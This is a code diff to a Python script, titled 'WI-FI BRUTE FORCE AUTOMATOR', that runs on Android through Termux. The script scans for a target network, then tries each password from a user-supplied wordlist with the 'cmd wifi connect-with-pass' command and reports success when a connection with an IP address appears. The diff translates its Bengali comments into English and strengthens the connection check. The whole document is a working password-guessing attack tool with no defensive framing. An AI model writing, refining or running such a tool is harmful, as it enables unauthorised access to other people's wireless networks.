@@ -11,6 +11,7 @@ BOLD = '\033[1m'
 BLUE = '\033[94m'
 
 def banner():
+    # Clear screen for a professional look
     os.system('clear')
     print(f"{RED}{BOLD}" + "="*45)
     print("        WI-FI BRUTE FORCE AUTOMATOR")
@@ -19,10 +20,10 @@ def banner():
     print(f"      {BLUE}Status: Termux-API Engine Active{RESET}\n")
 
 def check_ssid_availability(target_ssid):
-    # Termux-API ব্যবহার করে আশেপাশে থাকা ওয়াই-ফাই স্ক্যান করা
+    # Scan nearby networks using Termux-API
     print(f"[*] Scanning for SSID: {target_ssid}...")
     try:
-        # সরাসরি termux-wifi-scaninfo ব্যবহার করা হচ্ছে
+        # Directly using termux-wifi-scaninfo
         scan_output = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
         
         if target_ssid in scan_output:
@@ -36,7 +37,7 @@ def check_ssid_availability(target_ssid):
         return False
 
 def get_wordlist_path():
-    # ইউজার যদি সরাসরি ফাইল পাথ দিতে চায়
+    # Input for wordlist file path
     path = input(f"{BOLD}[+] Enter Wordlist Path (e.g., wordlist.txt): {RESET}")
     if os.path.exists(path):
         return path
@@ -69,27 +70,29 @@ def attack():
             
             for index, line in enumerate(lines, 1):
                 password = line.strip()
+                # WiFi passwords must be at least 8 characters long
                 if len(password) < 8: continue
                 
                 print(f"[*] Testing [{index}/{total_pass}]: {password}", end='\r')
                 
-                # Shizuku/rish এর বদলে সরাসরি Android CMD ব্যবহার
-                command = f'cmd wifi connect-with-pass {ssid} {password}'
+                # Using direct Android CMD instead of Shizuku/rish
+                command = f'cmd wifi connect-with-pass "{ssid}" "{password}"'
                 status = os.system(command)
                 
-                # অ্যান্ড্রয়েড ১৪-এ কানেকশন ইনিশিয়েট হলে স্ট্যাটাস ০ আসে
-                if status == 0:
-                    # ছোট একটা ভেরিফিকেশন চেক (কানেক্টেড কি না)
-                    time.sleep(3)
-                    check = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
-                    if ssid in check:
+                # Brief pause for connection initiation
+                time.sleep(3)
+                
+                # Verification of connection status
+                try:
+                    check_conn = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
+                    if ssid in check_conn and "ip_address" in check_conn:
                         print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Found Password: {password}{RESET}")
                         return
-
-                time.sleep(2) 
+                except:
+                    pass
                 
     except KeyboardInterrupt:
-        print(f"\n{RED}[!] Process terminated.{RESET}")
+        print(f"\n{RED}[!] Process terminated by user.{RESET}")
 
 if __name__ == "__main__":
     attack()
